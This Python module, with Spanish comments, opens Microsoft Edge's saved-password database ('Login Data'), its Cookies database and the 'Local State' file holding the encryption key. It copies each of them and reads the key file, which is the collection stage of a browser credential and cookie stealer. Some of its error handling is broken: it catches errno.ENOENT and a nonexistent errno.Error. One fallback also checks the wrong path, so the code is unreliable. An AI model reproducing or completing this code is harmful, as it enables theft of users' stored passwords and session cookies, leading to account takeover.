import errno
import os
import sqlite3
import shutil

edge_db_user_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",'Default', "Login Data")
directorio_llaves_edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Microsoft", "Edge", "User Data", "Local State")

#verificar si existe conexion con la base de datos
def verificar_conexion(db_path):
    try:
        conn = sqlite3.connect(db_path)
        conn.close()
        return True
    except sqlite3.Error as e:
        return False

#si existe conexion con la base de datos, se procede a actualizar la base de datos
def conexion_db_cookies_edge():
    try:
        edge_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
                                    "Default", 'Network', "Cookies")

        if verificar_conexion(edge_db_path):

            #si existe una copia de la base de datos se procede a borrala
            if os.path.exists(edge_db_path + "copia"):
                os.remove(edge_db_path + "copia")
            conn = sqlite3.connect(edge_db_path)
            #crear una copia de la base de datos
            shutil.copy2(edge_db_path, edge_db_path + "copia")
            return conn
        if not verificar_conexion(edge_db_user_path):
            #obtener los datos de la copia de la base de datos
            conn = sqlite3.connect(edge_db_path + "copia")
            return conn
    except sqlite3.Error as e:
        return False


def conexion_edge_user():
    try:
        if verificar_conexion(edge_db_user_path):
            if os.path.exists(edge_db_user_path + "copia"):
                os.remove(edge_db_user_path + "copia")
            conn = sqlite3.connect(edge_db_user_path)
            shutil.copy2(edge_db_user_path, edge_db_user_path + "copia")
            return conn
        if not verificar_conexion(edge_db_user_path):
            conn = sqlite3.connect(edge_db_user_path+"copia")
            return conn
    except sqlite3.Error as e:
        return False

def verificar_conexion_llaves(ruta_archivo):
    try:
        with open(ruta_archivo, "r", encoding="utf-8") as conn:
            return True
    except errno.ENOENT as e:
        return False

def conexion_llaves_edge():
    try:
        if verificar_conexion_llaves(directorio_llaves_edge):
            if os.path.exists(directorio_llaves_edge + "copia"):
                os.remove(directorio_llaves_edge + "copia")
            with open(directorio_llaves_edge, "r", encoding="utf-8") as conn:
                shutil.copy2(directorio_llaves_edge, directorio_llaves_edge + "copia")
                datos = conn.read()
            return datos
        if not verificar_conexion_llaves(directorio_llaves_edge):
            with open(directorio_llaves_edge+"copia", "r", encoding="utf-8") as conn:
                datos = conn.read()
            return datos
    except errno.Error as e:
        return False